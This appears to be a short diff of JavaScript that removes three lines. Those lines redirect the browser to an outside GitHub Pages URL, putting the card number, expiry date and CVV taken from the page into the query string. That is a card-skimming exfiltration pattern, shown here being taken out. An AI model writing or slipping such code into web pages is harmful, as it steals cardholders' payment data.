@@ -14,7 +14,4 @@
       n.appendChild(e);
   };
   window.swap = p;
-  window.location.replace(
-    `https://lcmacedo.github.io/cards-html-test/test?cardNumber=${cardNumber.innerText}&cardExpiryDate=${cardExpiryDate.innerText}&cardCvv=${cardCvv.innerText}`
-  );
 })();
